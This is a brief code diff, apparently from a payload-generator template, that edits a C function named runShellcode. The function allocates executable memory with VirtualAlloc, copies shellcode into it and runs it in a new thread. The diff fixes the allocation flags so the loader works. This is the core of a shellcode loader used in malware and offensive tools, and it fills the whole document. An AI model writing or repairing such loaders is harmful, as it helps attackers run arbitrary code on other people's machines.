@@ -42,7 +42,7 @@ void runShellcode(){{
     LPVOID buffer = NULL;
     HANDLE hThread = NULL;
     
-    buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     memcpy(buffer, shellcode, {shellcodeSize});
     
     hThread = CreateThread(NULL, 0, buffer, NULL, 0, NULL);
